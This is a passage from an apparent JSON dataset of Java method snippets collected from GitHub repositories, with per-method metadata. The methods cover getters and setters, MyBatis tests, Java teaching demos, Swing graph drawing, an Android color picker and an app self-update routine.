null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsgContentType(int msgContentType) {\n        this.msgContentType = msgContentType;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59148, "method_name": "getFromId", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFromId() {\n        return fromId;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59149, "method_name": "setFromId", "class_name": "Head", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFromId(String fromId) {\n        this.fromId = fromId;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59150, "method_name": "getToId", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getToId() {\n        return toId;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59151, "method_name": "setToId", "class_name": "Head", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setToId(String toId) {\n        this.toId = toId;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59152, "method_name": "getTimestamp", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getTimestamp() {\n        return timestamp;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59153, "method_name": "setTimestamp", "class_name": "Head", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTimestamp(long timestamp) {\n        this.timestamp = timestamp;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59154, "method_name": "getExtend", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExtend() {\n        return extend;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59155, "method_name": "setExtend", "class_name": "Head", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExtend(String extend) {\n        this.extend = extend;\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59156, "method_name": "toString", "class_name": "Head", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"Head{\" +\n                \"msgId='\" + msgId + '\\'' +\n                \", msgType=\" + msgType +\n                \", msgContentType=\" + msgContentType +\n                \", fromId='\" + fromId + '\\'' +\n                \", toId='\" + toId + '\\'' +\n                \", timestamp=\" + timestamp +\n                \", extend='\" + extend + '\\'' +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/mrchengwenlong/NettyIM/master/im_lib/src/main/java/com/takiku/im_lib/entity/Head.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59157, "method_name": "testCrossReferenceXmlConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testCrossReferenceXmlConfig() throws Exception {\n    testCrossReference(getSqlSessionFactoryXmlConfig());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59158, "method_name": "testCrossReferenceJavaConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testCrossReferenceJavaConfig() throws Exception {\n    testCrossReference(getSqlSessionFactoryJavaConfig());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59159, "method_name": "testCrossReference", "class_name": "ParameterMapReferenceTest", "params": ["SqlSessionFactory"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void testCrossReference(SqlSessionFactory sqlSessionFactory) {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      ParameterMapReferencePersonMapper personMapper = sqlSession.getMapper(ParameterMapReferencePersonMapper.class);\n      Person parameter = new Person();\n      parameter.setId(1);\n      Person person = personMapper.select(parameter);\n      assertEquals((Integer)1, person.getId());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59160, "method_name": "getSqlSessionFactoryXmlConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "SqlSessionFactory", "snippet": "  private SqlSessionFactory getSqlSessionFactoryXmlConfig() throws Exception {\n    try (Reader configReader = Resources\n        .getResourceAsReader(\"org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceMapperConfig.xml\")) {\n      SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configReader);\n\n      initDb(sqlSessionFactory);\n\n      return sqlSessionFactory;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59161, "method_name": "getSqlSessionFactoryJavaConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "SqlSessionFactory", "snippet": "  private SqlSessionFactory getSqlSessionFactoryJavaConfig() throws Exception {\n    Configuration configuration = new Configuration();\n    Environment environment = new Environment(\"development\", new JdbcTransactionFactory(), new UnpooledDataSource(\n        \"org.hsqldb.jdbcDriver\", \"jdbc:hsqldb:mem:xmlextref\", null));\n    configuration.setEnvironment(environment);\n    configuration.addMapper(ParameterMapReferencePersonMapper.class);\n    configuration.addMapper(ParameterMapReferencePetMapper.class);\n\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n\n    initDb(sqlSessionFactory);\n\n    return sqlSessionFactory;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59162, "method_name": "initDb", "class_name": "ParameterMapReferenceTest", "params": ["SqlSessionFactory"], "throws": ["IOException", "SQLException"], "modifiers": ["static", "private"], "return_type": "void", "snippet": "  private static void initDb(SqlSessionFactory sqlSessionFactory) throws IOException, SQLException {\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/xml_external_ref/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59163, "method_name": "getFieldOrder", "class_name": "TaskGetSpecialPortRequest", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"NDR\", \"which\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/kernel/TaskGetSpecialPortRequest.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 59164, "method_name": "printString", "class_name": "Demo01Printable", "params": ["Printable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printString(Printable p) {\n        p.print(\"HelloWorld\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo04/MethodReference/Demo01Printable.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59165, "method_name": "main", "class_name": "Demo01Printable", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u8c03\u7528printString\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Printable\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u6240\u4ee5\u53ef\u4ee5\u4f20\u9012Lambda\n        printString((s) -> {\n            System.out.println(s);\n        });\n\n        /*\n            \u5206\u6790:\n                Lambda\u8868\u8fbe\u5f0f\u7684\u76ee\u7684,\u6253\u5370\u53c2\u6570\u4f20\u9012\u7684\u5b57\u7b26\u4e32\n                \u628a\u53c2\u6570s,\u4f20\u9012\u7ed9\u4e86System.out\u5bf9\u8c61,\u8c03\u7528out\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5println\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u4e86\u8f93\u51fa\n                \u6ce8\u610f:\n                    1.System.out\u5bf9\u8c61\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n                    2.println\u65b9\u6cd5\u4e5f\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n                \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd5\u5f15\u7528\u6765\u4f18\u5316Lambda\u8868\u8fbe\u5f0f\n                \u53ef\u4ee5\u4f7f\u7528System.out\u65b9\u6cd5\u76f4\u63a5\u5f15\u7528(\u8c03\u7528)println\u65b9\u6cd5\n         */\n        printString(System.out::println);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo04/MethodReference/Demo01Printable.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59166, "method_name": "precioMedioAutomovil", "class_name": "Ford_L", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int precioMedioAutomovil() {\n        return 10000000;\n    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/L/Ford_L.java", "stars": "1", "class_props": {"extends": "AbsAutomovil_L", "implements": null, "modifiers": ["public"]}}, {"id": 59167, "method_name": "numAsientos", "class_name": "Ford_L", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numAsientos() {\n        return 5;\n    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/L/Ford_L.java", "stars": "1", "class_props": {"extends": "AbsAutomovil_L", "implements": null, "modifiers": ["public"]}}, {"id": 59168, "method_name": "main", "class_name": "Palindrome", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n//\t\t2. Check for the palindrome of the given string:\n//\t\t\tInput: \"malayalam\"\n//\t\t\toutput: Yes, Palindrome\n//\t\t\tInput: \"testleaf\"\n//\t\t\toutput: No, not a palindrome\n\t\t\n\t\t// Verify the reverse and orginal are same\n\t\tString str = \"malayalam\";\n\t\t// Creating an empty String to store the reversed value\n\t\tString rev = \"\";\n\t\t// Iterate over the original string\n\t\tfor (int i = str.length()-1 ; i >=0; i-- ) {\n\t\t\trev += str.charAt(i);\n\t\t}\n\t\t// Condition ? True Statement : False Statement\n\t\tSystem.out.println(str.equals(rev)?\"Yes, Palindrome\":\"No, Not a Palindrome\");\n\t\t\n\n\t}", "url": "https://raw.githubusercontent.com/AvinashDurai/MyCodes/master/javapractice/Palindrome.java", "stars": "19", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59169, "method_name": "onMenuItemClick", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onMenuItemClick (android.view.MenuItem p0)\n\t{\n\t\treturn n_onMenuItemClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59170, "method_name": "n_onMenuItemClick", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onMenuItemClick (android.view.MenuItem p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59171, "method_name": "monodroidAddReference", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59172, "method_name": "monodroidClearReferences", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59173, "method_name": "getFirst", "class_name": "Triple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "A", "snippet": "    public A getFirst() {\n        return first;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Triple.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59174, "method_name": "getSecond", "class_name": "Triple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "B", "snippet": "    public B getSecond() {\n        return second;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Triple.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59175, "method_name": "getThird", "class_name": "Triple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "C", "snippet": "    public C getThird() {\n        return third;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Triple.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59176, "method_name": "main", "class_name": "Demo02Ineger", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        /*\n            \u81ea\u52a8\u88c5\u7bb1:\u76f4\u63a5\u628aint\u7c7b\u578b\u7684\u6574\u6570\u8d4b\u503c\u5305\u88c5\u7c7b\n            Integer in = 1; \u5c31\u76f8\u5f53\u4e8e Integer in = new Integer(1);\n         */\n        Integer in = 1;\n\n        /*\n            \u81ea\u52a8\u62c6\u7bb1:in\u662f\u5305\u88c5\u7c7b,\u65e0\u6cd5\u76f4\u63a5\u53c2\u4e0e\u8fd0\u7b97,\u53ef\u4ee5\u81ea\u52a8\u8f6c\u6362\u4e3a\u57fa\u672c\u6570\u636e\u7c7b\u578b,\u5728\u8fdb\u884c\u8ba1\u7b97\n            in+2;\u5c31\u76f8\u5f53\u4e8e in.intVale() + 2 = 3\n            in = in.intVale() + 2 = 3 \u53c8\u662f\u4e00\u4e2a\u81ea\u52a8\u88c5\u7bb1\n         */\n        in = in+2;\n\n        ArrayList<Integer> list = new ArrayList<>();\n        /*\n            ArrayList\u96c6\u5408\u65e0\u6cd5\u76f4\u63a5\u5b58\u50a8\u6574\u6570,\u53ef\u4ee5\u5b58\u50a8Integer\u5305\u88c5\u7c7b\n         */\n        list.add(1); //-->\u81ea\u52a8\u88c5\u7bb1 list.add(new Integer(1));\n\n        int a = list.get(0); //-->\u81ea\u52a8\u62c6\u7bb1  list.get(0).intValue();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo07Integer/Demo02Ineger.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59177, "method_name": "getPreferredSize", "class_name": "DelayGraphPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Dimension", "snippet": "    public Dimension getPreferredSize() {\n        long max = -1;\n        for (final long delay : delays) {\n            if (delay > max) {\n                max = delay;\n            }\n        }\n        return new Dimension(delays.size(), 260);\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/client/src/main/java/com/javmarina/client/DelayGraphPanel.java", "stars": "17", "class_props": {"extends": "JPanel", "implements": null, "modifiers": ["public"]}}, {"id": 59178, "method_name": "paintComponent", "class_name": "DelayGraphPanel", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintComponent(final Graphics g) {\n        super.paintComponent(g);\n\n        final int length = delays.size();\n        if (length == 0) {\n            return;\n        }\n\n        final Graphics2D g2 = (Graphics2D) g;\n        g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);\n\n        // background\n        g2.setBackground(Color.LIGHT_GRAY);\n\n        // Draw horizontal axis\n        g2.setColor(Color.BLACK);\n        final int yZero = getHeight() - 10;\n        g2.drawLine(0, yZero, getWidth(), yZero);\n\n        double sum = 0;\n        long min = Long.MAX_VALUE;\n        long max = -1;\n        for (final long delay : delays) {\n            sum += delay;\n            if (delay > max) {\n                max = delay;\n            }\n            if (delay < min) {\n                min = delay;\n            }\n        }\n        final long maxx = max > 0 ? max : 1;\n\n        g2.setColor(Color.GRAY);\n        final int yAverage = getHeight() - 10 - (int) ((160/maxx) * sum/length);\n        g2.drawLine(0, yAverage, getWidth(), yAverage);\n\n        final int[] x = new int[length];\n        final int[] y = new int[length];\n        final int[] yEstimated = new int[length];\n        for (int i = 0; i < length; i++) {\n            x[i] = (int) Math.ceil(getWidth()*(i+1.0)/(MAX_ITEMS+2));\n            y[i] = getHeight() - 10 - (int) (160/maxx) * delays.get(i);\n            yEstimated[i] = getHeight() - 10 - (int) ((160/maxx) * estimated.get(i));\n        }\n\n        g2.setColor(Color.RED);\n        g2.drawPolyline(x, yEstimated, length);\n\n        g2.setColor(Color.BLUE);\n        g2.drawPolyline(x, y, length);\n        if (length < MAX_ITEMS) {\n            final Ellipse2D.Double circle = new Ellipse2D.Double(x[length-1]-1, y[length-1]-1, 4, 4);\n            g2.fill(circle);\n        }\n\n        String average = String.valueOf(sum/length);\n        if (average.length() > 6) {\n            average = average.substring(0, 6);\n        }\n\n        g2.setColor(Color.BLACK);\n        g2.drawString(\"Average RTT: \" + average + \" ms\", 5, 15);\n        g2.drawString(\"Minimum RTT: \" + min + \" ms\", 5, 30);\n        g2.drawString(\"Maximum RTT: \" + max + \" ms\", 5, 45);\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/client/src/main/java/com/javmarina/client/DelayGraphPanel.java", "stars": "17", "class_props": {"extends": "JPanel", "implements": null, "modifiers": ["public"]}}, {"id": 59179, "method_name": "addDelay", "class_name": "DelayGraphPanel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addDelay(final int delay) {\n        // First remove, then add\n        if (delays.size() == MAX_ITEMS) {\n            delays.remove(0);\n            estimated.remove(0);\n        }\n        delays.add(delay);\n        if (estimated.isEmpty()) {\n            estimated.add((float) delay);\n        } else {\n            estimated.add(GeneralUtils.lowPassFilter(estimated.get(estimated.size()-1), delay, BETA));\n        }\n        repaint();\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/client/src/main/java/com/javmarina/client/DelayGraphPanel.java", "stars": "17", "class_props": {"extends": "JPanel", "implements": null, "modifiers": ["public"]}}, {"id": 59180, "method_name": "onCreateDialog", "class_name": "ColorPickerDialogFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "    public Dialog onCreateDialog(Bundle savedInstanceState) {\n        View view = View.inflate(getActivity(), R.layout.fragment_dialog_colorpicker, null);\n        ButterKnife.bind(this, view);\n\n        colorPicker.addSVBar(svBar);\n        colorPicker.addOpacityBar(opacityBar);\n\n        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());\n\n        if (getArguments() == null || !getArguments().containsKey(TITLE) || mOnResultListener == null) {\n            return builder.create();\n        }\n\n        if (getArguments().containsKey(DEFAULT_VALUE)) {\n            int color = getArguments().getInt(DEFAULT_VALUE);\n            colorPicker.setColor(color);\n            colorPicker.setOldCenterColor(color);\n            colorPicker.setNewCenterColor(color);\n        }\n\n        builder\n                .setView(view)\n                .setTitle(getArguments().getString(TITLE))\n                .setPositiveButton(R.string.ok,\n                        new DialogInterface.OnClickListener() {\n                            @Override\n                            public void onClick(DialogInterface dialog, int which) {\n                                mOnResultListener.onNewValue(colorPicker.getColor());\n                                dialog.dismiss();\n                            }\n                        })\n                .setNegativeButton(R.string.cancel,\n                        new DialogInterface.OnClickListener() {\n                            @Override\n                            public void onClick(DialogInterface dialog, int which) {\n                                dialog.dismiss();\n                            }\n                        }\n                );\n\n        return builder.create();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/dialog/ColorPickerDialogFragment.java", "stars": "4", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 59181, "method_name": "setOnResultListener", "class_name": "ColorPickerDialogFragment", "params": ["ResultListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnResultListener(ResultListener resultListener) {\n        mOnResultListener = resultListener;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/dialog/ColorPickerDialogFragment.java", "stars": "4", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 59182, "method_name": "getApkName", "class_name": "GetUpdateAppAsyncTask", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getApkName(Context context) {\n        String packageName = context.getPackageName();\n        PackageManager pm = context.getPackageManager();\n        try {\n            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);\n            String apk = ai.publicSourceDir;\n            return apk;\n        } catch (Throwable x) {\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Tasks/GetUpdateAppAsyncTask.java", "stars": "9", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["public"]}}, {"id": 59183, "method_name": "onPreExecute", "class_name": "GetUpdateAppAsyncTask", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPreExecute() {\n        try {\n            File outputDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);\n            File file = new File(outputDir,\"idanplusplus.apk\");\n            if (file.exists())\n                file.delete();\n//            mSpinnerFragment = new SpinnerFragment();\n//            activity.getSupportFragmentManager().beginTransaction().add(fragmentId, mSpinnerFragment).commit();\n            mProgressDialog = new ProgressDialog(activity);\n            mProgressDialog.setMessage(activity.getString(R.string.CHECK_UPDATE_MSG));\n            mProgressDialog.setIndeterminate(true);\n            mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);\n            mProgressDialog.setCancelable(true);\n            mProgressDialog.setOnCancelListener(new DialogInterface.OnCancelListener() {\n\n                @Override\n                public void onCancel(DialogInterface dialog) {\n                    cancel(true);\n                    activity.finish();\n                }\n            });\n            PowerManager pm = (PowerManager) activity.getSystemService(Context.POWER_SERVICE);\n            mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,getClass().getName());\n            mWakeLock.acquire();\n            mProgressDialog.show();\n\n        } catch (Exception e) {\n            activity.finish();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Tasks/GetUpdateAppAsyncTask.java", "stars": "9", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["public"]}}, {"id": 59184, "method_name": "doInBackground", "class_name": "GetUpdateAppAsyncTask", "params": ["Void"], "throws": null, "modifiers": ["protected"], "return_type": "List<Object>", "snippet": "    protected List<Object> doInBackground(Void... voids) {\n        List<Object> returnList = new ArrayList<>();\n        try {\n            Integer serverVersion;\n            Integer localVersion;\n            String baseUrl = Utils.getBaseUrlEmpty();\n            String versionUrl = Utils.getUpdateVersionUrl();\n            String serverVersionEncoded = Utils.getUpdateSoftwareService(null).UpdateSoftware(versionUrl).blockingFirst();\n            String versionStr = new String(Base64.decode(serverVersionEncoded,Base64.NO_WRAP));\n            String[] versions = versionStr.split(\"\\\\@\");\n            String apk = getApkName(activity.getApplicationContext());\n            if (MD5.checkMD5(versions[0],new File(apk))) {\n                return returnList;\n            } else {\n                serverVersion = Integer.parseInt(versions[1]);\n                localVersion = Utils.getVersionCode(activity);\n                String getAppUrl = Utils.getAppUrl();\n\n                URL url = new URL(getAppUrl);\n                URLConnection conection = url.openConnection();\n                conection.connect();\n\n\n//                Response<ResponseBody> appUrlResponse = updateSoftwareService.getHtml(getAppUrl).execute();\n                File file = null;\n                if (WebapiSingleton.isTv) {\n                    File outputDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);\n                    try {\n                        file = new File(outputDir, \"idanplusplus.apk\");\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                        file = null;\n                    }\n                } else {\n                    File outputDir =Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);\n                    try {\n                        file = new File(outputDir, \"idanplusplus.apk\");\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                        file = null;\n                    }\n                }\n                //InputStream input = appUrlResponse.body().byteStream();\n                InputStream input = new BufferedInputStream(url.openStream(),8192);\n                try {\n                   // long fileLength = appUrlResponse.body().contentLength();\n                    int fileLength = conection.getContentLength();\n                    OutputStream output = new FileOutputStream(file);\n                    try {\n                        byte[] buffer = new byte[4096]; // or other buffer size\n                        long total = 0;\n                        int read;\n                        while ((read = input.read(buffer)) != -1) {\n                            total += read;\n                            if (isCancelled()) {\n                                input.close();\n                                returnList.add(-2);\n                                returnList.add(-2);\n                                returnList.add(null);\n                                return returnList;\n                            }\n                            // publishing the progress....\n                            if (fileLength > 0) // only if total length is known\n                                publishProgress((int) (total * 100 / fileLength));\n                            output.write(buffer, 0, read);\n                        }\n                        output.flush();\n                    } finally {\n                        output.close();\n                    }\n                } catch (FileNotFoundException e) {\n                    e.printStackTrace();\n                    file = null;\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    file = 